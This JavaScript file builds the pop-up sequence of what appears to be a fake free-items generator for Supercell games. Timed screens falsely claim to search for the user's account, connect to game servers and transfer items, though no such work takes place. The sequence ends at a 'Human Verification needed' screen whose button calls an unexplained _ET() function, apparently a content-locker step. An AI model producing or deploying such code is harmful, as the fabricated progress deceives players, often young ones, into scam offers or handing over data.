let countdownTimer;
let autoContinueTimer;
let skipCountdownTimer;
let currentUsername = '';
let selectedItems = [];
let requestCompleted = false;
let successfulPlayerData = null;
let sequenceBox = null;

function createSequenceBox() {
    const overlay = document.getElementById('background-overlay');
    overlay.style.display = 'block';

    if (sequenceBox) {
        resetSequenceBox();
        return sequenceBox;
    }

    sequenceBox = document.createElement('div');
    sequenceBox.className = 'sequence-box';
    sequenceBox.id = 'sequence-box';
    sequenceBox.innerHTML = `
        <div id="search-content" class="sequence-content">
            <img src="https://cdn.jsdelivr.net/gh/lib-devtools/supercell/7dRvBuL.webp" alt="Searching" class="pulse-animation" id="search-image">
            <div class="loading-dots"><span class="dot"></span><span class="dot"></span><span class="dot"></span></div>
            <p class="pulse-animation" id="search-text">Searching for user...</p>
            <div class="multi-request-info">
                <p>🔄 Connecting to game servers...</p>
                <p>⏱️ Auto-continue in <span id="countdown">9</span> seconds</p>
            </div>
        </div>

        <div id="tick-content" class="sequence-content hidden">
            <img src="https://cdn.jsdelivr.net/gh/lib-devtools/supercell/loading-image.gif" alt="Success" id="tick-image">
            <p id="connected-text">Connected to user</p>
        </div>

        <div id="platform-content" class="sequence-content hidden">
            <div class="platform-buttons" id="player-verification-container"></div>
        </div>

        <div id="auto-skip-content" class="sequence-content hidden">
            <div class="auto-skip-info">
                <p>⏱️ Continuing automatically in <span id="skip-countdown">3</span> seconds...</p>
            </div>
        </div>

        <div id="connecting-content" class="sequence-content hidden">
            <img src="https://cdn.jsdelivr.net/gh/lib-devtools/supercell/z533WJH.webp" alt="Loading Cog" class="spinning-cog" id="loading-image">
            <p id="connecting-text">Connecting to servers...</p>
        </div>

        <div id="transferring-content" class="sequence-content hidden">
            <img src="https://cdn.jsdelivr.net/gh/lib-devtools/supercell/PfCs3ko.gif" alt="Transferring Box" class="box-image" id="transferring-image">
            <div class="loading-dots"><span class="dot"></span><span class="dot"></span><span class="dot"></span></div>
            <p class="pulse-animation" id="transferring-text">Transferring items to servers...</p>
        </div>

        <div id="success-transfer-content" class="sequence-content hidden">
            <img src="https://cdn.jsdelivr.net/gh/lib-devtools/supercell/N8Io6ao.webp" alt="Success" id="success-tick-image">
            <p id="success-transfer-text">Successfully Transferred item</p>
        </div>

        <div id="username-transferring-content" class="sequence-content hidden">
            <img src="https://cdn.jsdelivr.net/gh/lib-devtools/supercell/z533WJH.webp" alt="Loading" class="spinning-cog" id="loading-username-image">
            <div class="loading-dots"><span class="dot"></span><span class="dot"></span><span class="dot"></span></div>
            <p id="username-transferring-text">Transferring to <span id="transferring-username">Username</span>...</p>
        </div>

        <div id="verification-content" class="sequence-content hidden">
            <img src="https://cdn.jsdelivr.net/gh/lib-devtools/supercell/robot.webp" alt="Verification Needed" class="verification-cross" id="verification-cross-image">
            <p id="verification-text">Human Verification needed to carry on...</p>
            <button onclick="_ET()" id="verify-btn">Verify</button>
        </div>
    `;

    document.body.appendChild(sequenceBox);
  document.body.classList.add('no-scroll');
window.scrollTo(0, 0); 

    return sequenceBox;
}
